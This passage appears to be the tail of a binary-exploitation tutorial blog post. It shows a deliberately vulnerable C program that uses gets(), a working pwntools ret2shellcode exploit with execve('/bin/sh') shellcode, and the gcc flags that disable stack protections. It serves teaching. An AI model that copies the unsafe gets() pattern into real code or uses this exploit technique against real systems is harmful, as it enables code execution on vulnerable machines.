+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hack_me</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// chonk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">200</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hit me with your best shot @%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>buffer);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gets</span>(<span style="color:#f92672">&amp;</span>buffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>argv[])
+</span></span><span style="display:flex;"><span>{   
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">hack_me</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Mission failed&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When we run the compiled program we receive the following output:</p>
+<pre tabindex="0"><code>Hit me with your best shot @0xffdacae8
+</code></pre><p>with an input prompt on the next line. The hex after the @ corresponds to the buffers address on the stack.</p>
+<h4 id="exploit">Exploit</h4>
+<p>An example exploit for the above binary could be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2shellcode&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Receiving banner...&#34;</span>)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;@&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Buffer address: &#34;</span> <span style="color:#f92672">+</span> hex(buffer_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># attach debugger to see in gdb</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(proc) </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor eax, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor ebx, ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor ecx, ecx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor edx, edx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push eax     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 0x68732f2f   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 0x6e69622f 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov ebx, esp   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push eax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov ecx, esp
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov eax, 0xb     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># send overflow to test offset to return</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#overflow = cyclic(350)</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">&#34;daac&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> fit({
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>: shellcode,
+</span></span><span style="display:flex;"><span>    offset: p32(buffer_addr)
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>I highly recommend stepping through the exploit with gdb attached and observing how the flow of the program changes to the buffer and watching as the instructions we placed get executed one by one.</p>
+<h2 id="resources">Resources</h2>
+<p><em>Note the above binaries were compiled with gcc as follows:</em></p>
+<p><code>gcc -z execstack -fno-stack-protector -no-pie -z norelro -m32 -g &lt;c_source&gt; -o &lt;binary&gt;</code></p>
+<ul>
+<li><a href="https://guyinatuxedo.github.io">Nightmare</a></li>
+<li><a href="https://www.youtube.com/watch?v=iyAyN3GFM7A&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Liveoverflow Binary Exploitation</a></li>
+<li><a href="https://github.com/Gallopsled/pwntools-tutorial#readme">pwntools tutorial</a></li>
+<li><a href="https://www.youtube.com/watch?v=yH8kzOkA_vw&amp;list=PL1H1sBF1VAKVg451vJ-rx0y_ZuQMHPamH">John Hammond Binary Exploitation</a></li>
+<li><a href="https://github.com/Angus-C-git/SecSheets/tree/master/Binary%20Exploitation">SecSheets</a></li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://cybernetic.coffee/tags/buffer-overflows/">Buffer Overflows</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/exploit-development/">Exploit Development</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/stack-based-overflows/">Stack Based Overflows</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/pwntools/">pwntools</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/pentesting/">pentesting</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/hacking/">hacking</a></span>
+        
+    </p>
+
+
+
+            <p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                    <polyline points="14 2 14 8 20 8"></polyline>
+                    <line x1="16" y1="13" x2="8" y2="13"></line>
+                    <line x1="16" y1="17" x2="8" y2="17"></line>
+                    <polyline points="10 9 9 9 8 9"></polyline>
+                </svg>
+                3517 Words
+            </p>
+  		</div>
+        
+
+
+        
+            
+                <div class="pagination">
+                    <div class="pagination__title">
+                        <span class="pagination__title-h"></span>
+
+                    </div>
+
+                    <div class="pagination__buttons">
+                        
+                        <span class="button previous">
+                      <a href="https://cybernetic.coffee/blog/rop-emporium-revisited/">
+                        <span class="button__icon">←</span>
+                        <span class="button__text">ROP Emporium Revisited</span>
+                      </a>
+                    </span>
+                        
+
+                        
+                            <span class="button next">
+                              <a href="https://cybernetic.coffee/blog/web-app-testing-methodologies/">
+                                <span class="button__text">Web Application Testing Methodologies</span>
+                                <span class="button__icon">→</span>
+                              </a>
+                            </span>
+                        
+                    </div>
+                </div>
+            
+        
+
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Hacked together with &#10084; by <a href="https://github.com/Angus-C-git">Angus C</a> <i class='fas fa-ghost'></i> </span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.755e4cf350f154c0fee20aa6a1b7fa2b35fcbeaaf4cc62ef45531b19ae1fd43e5ed19c3c3bbf522045953eaef03e1cb96a64a636782486a3aa0b0563d0ef5406.js" integrity="sha512-dV5M81DxVMD&#43;4gqmobf6KzX8vqr0zGLvRVMbGa4f1D5e0Zw8O79SIEWVPq7wPhy5amSmNngkhqOqCwVj0O9UBg=="></script>
+
+
+
+    </body>
+</html>
